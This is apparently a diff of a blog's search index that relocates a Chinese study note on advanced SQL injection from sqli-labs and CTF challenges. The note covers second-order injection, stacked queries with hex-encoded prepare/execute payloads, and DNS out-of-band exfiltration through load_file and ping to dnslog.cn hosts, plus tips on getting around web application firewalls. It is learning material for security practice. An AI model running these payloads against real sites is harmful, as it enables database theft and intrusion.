@@ -584,44 +584,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>sql注入之复杂注入利用</title>
-    <url>/2023/04/12/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="复杂注入利用"><a href="#复杂注入利用" class="headerlink" title="复杂注入利用"></a>复杂注入利用</h2><pre><code>        - 二次注入 dnslog注入 绕过bypass等
-</code></pre>
-<p><a href="http://dnslog.cn/">http://dnslog.cn</a></p>
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="#二次注入"></a>#二次注入</h3><p>Less - 24 Second Degree Injections <em>Real treat</em> -Store Injections (二次注入)</p>
-<p>$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin ‘</p>
-<p>(pass_change.php)</p>
-<p>![image-20230405150014162](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405150014162.png)</p>
-<p>![image-20230405161322984](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405161322984.png)</p>
-<p>网鼎杯2018Unfinish</p>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="#堆叠注入"></a>#堆叠注入</h3><p>Less-38 stacked Query</p>
-<p>​		;update users set password&#x3D;’123456’ where username&#x3D;’Dumb’;</p>
-<p>强网杯2019随便注</p>
-<p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://buuoj.cn/challenges</span><br><span class="line"></span><br><span class="line">根据数据库类型决定是否支持多条语句执行</span><br><span class="line"></span><br><span class="line">支持堆叠数据库类型：MYSQL MSSQL Postgresql等</span><br><span class="line"></span><br><span class="line">1&#x27; or 1=1#</span><br><span class="line"></span><br><span class="line">1&#x27; order by 1 *#* </span><br><span class="line"></span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;;show databases;</span><br><span class="line"></span><br><span class="line">&#x27;;show tables;</span><br><span class="line"></span><br><span class="line">&#x27;;show columns from `1919810931114514`;		//words  1919810931114514</span><br><span class="line"></span><br><span class="line">&#x27;;select flag from `1919810931114514`;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;;SeT @a=0x73656c656374202a2066726f6d2060776f72647360;prepare mmm from @a;execute mmm;</span><br><span class="line"></span><br><span class="line">&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare mmm from @a;execute mmm;</span><br><span class="line"></span><br><span class="line">- prepare…from…是预处理语句，会进行编码转换。</span><br><span class="line">- execute用来执行由SQLPrepare创建的SQL语句。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="DNS利用"><a href="#DNS利用" class="headerlink" title="#DNS利用"></a>#DNS利用</h3><h4 id="1-平台"><a href="#1-平台" class="headerlink" title="1.平台"></a>1.平台</h4><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
-<p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p>
-<p><a href="http://ceye.io/">http://ceye.io</a></p>
-<p>![image-20221129113922708](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20221129113922708.png)</p>
-<h4 id="2-应用场景："><a href="#2-应用场景：" class="headerlink" title="2.应用场景："></a>2.应用场景：</h4><p>解决不回显，反向连接，SQL注入，命令执行，SSRF等</p>
-<p>SQL注入：</p>
-<p>select load_file(concat(‘\\‘,(select database()),’.4xxuwq.dnslog.cn\abc’));</p>
-<p>and  (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.xxx.dnslog.cn&#x2F;abc’)))</p>
-<h4 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h4><p>ping %USERNAME%.juwch5.dnslog.cn</p>
-<p>*1： 如果web站点有waf 但可以找出真实ip，我们可以通过真实ip去访问站点，或许这时候我们所访问的真实ip就不存在waf了进而形成注入</p>
-<p>*2： 我们也可以爬取整个web站点的接口，因为有可能开发人员在开发的时候，就对一个接口忘记添加waf了</p>
-<p>*3：在实战中，可控的表名、列名、order by、sort、desc、limit参数后，不属于用户的输入，也能造成注入，这就是预编译不能完全防范sql注入的原因。</p>
-<p><strong>常用手法</strong>：</p>
-<p>单引号报错，双引号正常(对比返回长度)可能存在注入，然后判断数据库类型，套用各数据库语句函数，证明有注，之后可以放入sqlmap中跑出注入或者自己写脚本来跑</p>
-]]></content>
-  </entry>
-  <entry>
     <title>sql注入WAF绕过</title>
     <url>/2023/04/12/sql%E6%B3%A8%E5%85%A5waf%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<h1 id="SQL注入WAF绕过"><a href="#SQL注入WAF绕过" class="headerlink" title="SQL注入WAF绕过"></a>SQL注入WAF绕过</h1><h3 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1 大小写绕过"></a>1 大小写绕过</h3><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</p>
@@ -673,6 +635,44 @@
 <h3 id="14-判断列数绕过"><a href="#14-判断列数绕过" class="headerlink" title="14 判断列数绕过"></a>14 判断列数绕过</h3><p>当order by 被过滤后就可以使用into 变量来绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from yz limit 1,1 into @a,@b,@c;</span><br></pre></td></tr></table></figure>
 
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入之复杂注入利用</title>
+    <url>/2023/04/12/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="复杂注入利用"><a href="#复杂注入利用" class="headerlink" title="复杂注入利用"></a>复杂注入利用</h2><pre><code>        - 二次注入 dnslog注入 绕过bypass等
+</code></pre>
+<p><a href="http://dnslog.cn/">http://dnslog.cn</a></p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="#二次注入"></a>#二次注入</h3><p>Less - 24 Second Degree Injections <em>Real treat</em> -Store Injections (二次注入)</p>
+<p>$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin ‘</p>
+<p>(pass_change.php)</p>
+<p>![image-20230405150014162](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405150014162.png)</p>
+<p>![image-20230405161322984](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405161322984.png)</p>
+<p>网鼎杯2018Unfinish</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="#堆叠注入"></a>#堆叠注入</h3><p>Less-38 stacked Query</p>
+<p>​		;update users set password&#x3D;’123456’ where username&#x3D;’Dumb’;</p>
+<p>强网杯2019随便注</p>
+<p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://buuoj.cn/challenges</span><br><span class="line"></span><br><span class="line">根据数据库类型决定是否支持多条语句执行</span><br><span class="line"></span><br><span class="line">支持堆叠数据库类型：MYSQL MSSQL Postgresql等</span><br><span class="line"></span><br><span class="line">1&#x27; or 1=1#</span><br><span class="line"></span><br><span class="line">1&#x27; order by 1 *#* </span><br><span class="line"></span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;;show databases;</span><br><span class="line"></span><br><span class="line">&#x27;;show tables;</span><br><span class="line"></span><br><span class="line">&#x27;;show columns from `1919810931114514`;		//words  1919810931114514</span><br><span class="line"></span><br><span class="line">&#x27;;select flag from `1919810931114514`;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;;SeT @a=0x73656c656374202a2066726f6d2060776f72647360;prepare mmm from @a;execute mmm;</span><br><span class="line"></span><br><span class="line">&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare mmm from @a;execute mmm;</span><br><span class="line"></span><br><span class="line">- prepare…from…是预处理语句，会进行编码转换。</span><br><span class="line">- execute用来执行由SQLPrepare创建的SQL语句。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="DNS利用"><a href="#DNS利用" class="headerlink" title="#DNS利用"></a>#DNS利用</h3><h4 id="1-平台"><a href="#1-平台" class="headerlink" title="1.平台"></a>1.平台</h4><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
+<p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p>
+<p><a href="http://ceye.io/">http://ceye.io</a></p>
+<p>![image-20221129113922708](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20221129113922708.png)</p>
+<h4 id="2-应用场景："><a href="#2-应用场景：" class="headerlink" title="2.应用场景："></a>2.应用场景：</h4><p>解决不回显，反向连接，SQL注入，命令执行，SSRF等</p>
+<p>SQL注入：</p>
+<p>select load_file(concat(‘\\‘,(select database()),’.4xxuwq.dnslog.cn\abc’));</p>
+<p>and  (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.xxx.dnslog.cn&#x2F;abc’)))</p>
+<h4 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h4><p>ping %USERNAME%.juwch5.dnslog.cn</p>
+<p>*1： 如果web站点有waf 但可以找出真实ip，我们可以通过真实ip去访问站点，或许这时候我们所访问的真实ip就不存在waf了进而形成注入</p>
+<p>*2： 我们也可以爬取整个web站点的接口，因为有可能开发人员在开发的时候，就对一个接口忘记添加waf了</p>
+<p>*3：在实战中，可控的表名、列名、order by、sort、desc、limit参数后，不属于用户的输入，也能造成注入，这就是预编译不能完全防范sql注入的原因。</p>
+<p><strong>常用手法</strong>：</p>
+<p>单引号报错，双引号正常(对比返回长度)可能存在注入，然后判断数据库类型，套用各数据库语句函数，证明有注，之后可以放入sqlmap中跑出注入或者自己写脚本来跑</p>
 ]]></content>
   </entry>
 </search>
